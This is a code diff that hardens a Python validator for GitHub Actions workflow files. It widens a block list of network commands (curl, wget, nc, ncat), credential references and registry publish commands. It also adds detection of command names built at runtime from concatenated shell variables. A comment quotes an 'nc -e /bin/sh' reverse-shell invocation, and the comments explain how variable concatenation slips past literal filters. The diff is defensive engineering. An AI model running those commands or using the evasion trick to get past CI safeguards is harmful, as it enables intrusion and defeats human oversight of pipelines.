@@ -52,12 +52,29 @@ FORBIDDEN_PATTERNS = (
     (r"\bgh_token\b", "GH_TOKEN credential reference"),
     (r"\bcurl\b", "'curl' (network command)"),
     (r"\bwget\b", "'wget' (network command)"),
-    (r"\bnc\s+-", "'nc' (network command)"),
+    # Bare invocation (`nc host port`, no flag at all) is exactly as
+    # dangerous as a flagged one (`nc -e /bin/sh host port`) -- a fresh,
+    # independent verifier reproduced the previous `nc\s+-`-only pattern
+    # missing it. `\bnc\b` alone (any standalone "nc" token, flagged or
+    # not) closes that gap; the `\b` word-boundary already prevents this
+    # from matching as a mere substring inside an unrelated identifier
+    # (e.g. "sync", "func", "async", "runc" all keep "nc" glued to a
+    # preceding word character, so no boundary ever forms there).
+    (r"\bnc\b", "'nc' (network command, bare or flagged invocation)"),
     (r"\bncat\b", "'ncat' (network command)"),
     (r"base64\s+(-d|--decode)", "base64 decode (common obfuscation/indirection pattern)"),
     (r"\bsh\s+-c\b", "'sh -c' (shell indirection)"),
     (r"\bbash\s+-c\b", "'bash -c' (shell indirection)"),
     (r"\beval\b", "'eval' (shell/command indirection)"),
+    # Package/registry publish + registry-credential commands (issue #9
+    # residual hardening): a fresh, independent verifier reproduced these
+    # as unrejected -- symmetrical with the existing `gh release`/`git
+    # push`/`git tag` ref-mutation and release-action heuristics above.
+    (r"\bnpm\s+publish\b", "'npm publish' (package registry publish command)"),
+    (r"\byarn\s+publish\b", "'yarn publish' (package registry publish command)"),
+    (r"\bpnpm\s+publish\b", "'pnpm publish' (package registry publish command)"),
+    (r"\bdocker(\s+image)?\s+push\b", "'docker push' (container image publish command)"),
+    (r"\bdocker\s+login\b", "'docker login' (container registry credential command)"),
     (r"write-all", "GitHub Actions 'write-all' permissions shorthand"),
 )
 _COMPILED_FORBIDDEN_PATTERNS = [(re.compile(pattern, re.IGNORECASE), label) for pattern, label in FORBIDDEN_PATTERNS]
@@ -69,6 +86,110 @@ _COMPILED_FORBIDDEN_PATTERNS = [(re.compile(pattern, re.IGNORECASE), label) for 
 # caught. Deliberately case-insensitive.
 _USES_LINE_RE = re.compile(r"^\s*(?:-\s*)?uses:\s*(\S+)", re.IGNORECASE | re.MULTILINE)
 _DANGEROUS_ACTION_NAME_SUBSTRINGS = ("upload", "release", "publish", "deploy")
+
+
+# --- Shell variable/fragment command assembly (issue #9 residual
+# hardening) ------------------------------------------------------------
+#
+# A fresh, independent verifier reproduced a dangerous command name
+# assembled at *runtime* from two or more concatenated shell variable
+# expansions in command position -- e.g. `X=cur; Y=l; $X$Y
+# https://example.invalid` actually executes `curl ...` even though the
+# literal substring "curl" never appears anywhere in the workflow file,
+# so no substring/regex rule in `FORBIDDEN_PATTERNS` above can ever
+# match it. This is a narrow, deliberately conservative, command-
+# position/assignment-aware heuristic -- not a shell parser -- covering
+# exactly the high-confidence shapes issue #9 names: `$X$Y`, `${X}${Y}`
+# (and any bare/braced mix, 2 or more fragments), concatenated with zero
+# intervening whitespace; and a single shell variable invoked directly
+# as a command after being locally assigned a literal value earlier in
+# the very same script (`CMD=curl` ... `$CMD https://...` -- no
+# assembly needed, just one layer of indirection).
+#
+# This must never flag this real workflow's own safe, ordinary
+# `>> "$GITHUB_STEP_SUMMARY"` job-summary redirection, nor ordinary
+# non-command data interpolation (e.g. `echo "$A$B"`): both sit *after*
+# the actual command name, never *at* command position, which is
+# exactly what "command position" (defined below) excludes.
+_VAR_REF = r"\$\{[A-Za-z_][A-Za-z0-9_]*\}|\$[A-Za-z_][A-Za-z0-9_]*"
+_STATEMENT_SEP = r"(?:;|&&|\|\||\|)"
+# A YAML `run:` scalar's *inline* value start (e.g. `- run: CMD=curl; ...`,
+# the whole script on one physical text line) -- the shell script here
+# begins right after the `run:` key, not at column 0 of the raw YAML
+# text, so a bare `^` alone would miss it. Block-scalar forms
+# (`run: |`, `run: >-`, ...) are unaffected: their actual command text
+# starts on the *next* line, which the plain `^` alternative already
+# covers, and the literal characters right after "run:" there (`|`,
+# `>`, a fold/chomp indicator) never satisfy the identifier/`$`
+# patterns below anyway, so no separate carve-out is needed for them.
+_RUN_SCALAR_PREFIX = r"\brun:[ \t]*"
+# The start of a `run:` script line (any line -- real line-continuations
+# are already collapsed by `_normalize_for_scanning` before this ever
+# runs), the inline start of a `run:` scalar's value on the same text
+# line, or, on the same line, immediately after a shell command
+# separator (`;`, `&&`, `||`, or a pipe `|`). Deliberately line/
+# separator-aware rather than a full parser -- see module docstring.
+_COMMAND_POSITION_PREFIX = rf"(?:^|{_STATEMENT_SEP}|{_RUN_SCALAR_PREFIX})[ \t]*"
+# A statement boundary: another separator, or a genuine end-of-line/
+# end-of-text -- `\r` and `\n` are both matched directly (rather than
+# relying solely on MULTILINE `$`, which sits *before* a bare `\n` and
+# would otherwise miss a CRLF file's trailing `\r`).
+_STATEMENT_END = rf"(?:{_STATEMENT_SEP}|[\r\n]|$)"
+_BOUNDARY_AFTER = r"(?:[ \t\r\n]|$)"
+
+_CONCATENATED_VAR_REFS_RE = re.compile(
+    rf"{_COMMAND_POSITION_PREFIX}(?:{_VAR_REF}){{2,}}", re.MULTILINE
+)
+_COMMAND_POSITION_SINGLE_VAR_RE = re.compile(
+    rf"{_COMMAND_POSITION_PREFIX}({_VAR_REF})(?={_BOUNDARY_AFTER})", re.MULTILINE
+)
+# A "pure" local shell-variable assignment statement: exactly
+# `NAME=value` occupying an entire command position by itself (no
+# attached command afterward on the same statement -- so the common,
+# legitimate `FOO=bar some-command args` inline-env-var-prefix idiom is
+# deliberately *not* matched/recorded here). Never tries to resolve/
+# interpret `value` itself (no shell parser); merely recording *that*
+# `NAME` was locally assigned anything at all is enough to make a later
+# bare `$NAME`/`${NAME}` command-position invocation of it suspicious.
+_PURE_ASSIGNMENT_RE = re.compile(
+    rf"{_COMMAND_POSITION_PREFIX}([A-Za-z_][A-Za-z0-9_]*)=[^\s;&|]*[ \t]*(?={_STATEMENT_END})",
+    re.MULTILINE,
+)
+_SINGLE_VAR_NAME_RE = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?")
+
+
+def check_variable_command_assembly(text: str) -> List[str]:
+    """Rejects (1) two or more shell variable expansions concatenated
+    with zero intervening whitespace in command position (`$X$Y`,
+    `${X}${Y}`, and any bare/braced mix) -- a command name assembled at
+    runtime from separately-innocuous fragments -- and (2) a single
+    shell variable, previously assigned a literal value elsewhere in the
+    very same script, later invoked directly in command position (e.g.
+    `CMD=curl` ... `$CMD https://...`). Both are high-confidence,
+    command-position-aware evasions of every literal-command-name check
+    in `FORBIDDEN_PATTERNS` above; neither ever fires against ordinary
+    tail-position interpolation (e.g. this repository's own real
+    `>> "$GITHUB_STEP_SUMMARY"`) or plain data interpolation, since
+    those never sit in command position."""
+    violations: List[str] = []
+    for match in _CONCATENATED_VAR_REFS_RE.finditer(text):
+        shown = re.sub(r"^[ \t;&|]+", "", match.group(0))
+        violations.append(
+            "command position invokes a name assembled by concatenating 2+ shell variable "
+            f"expansions with no separator (evades literal-command-name detection): {shown!r}"
+        )
+    assigned_names = {match.group(1) for match in _PURE_ASSIGNMENT_RE.finditer(text)}
+    if assigned_names:
+        for match in _COMMAND_POSITION_SINGLE_VAR_RE.finditer(text):
+            name_match = _SINGLE_VAR_NAME_RE.fullmatch(match.group(1))
+            if name_match and name_match.group(1) in assigned_names:
+                shown = re.sub(r"^[ \t;&|]+", "", match.group(0))
+                violations.append(
+                    "command position directly invokes shell variable "
+                    f"{match.group(1)!r}, which was locally assigned a literal value earlier "
+                    f"in this same script (evades literal-command-name detection): {shown!r}"
+                )
+    return violations
 
 
 def _normalize_for_scanning(text: str) -> str:
@@ -270,6 +391,7 @@ def validate_workflow_text(text: str) -> List[str]:
     violations.extend(check_checkout_pin(normalized))
     violations.extend(check_forbidden_patterns(normalized))
     violations.extend(check_dangerous_uses_actions(normalized))
+    violations.extend(check_variable_command_assembly(normalized))
     return sorted(set(violations))
 
 
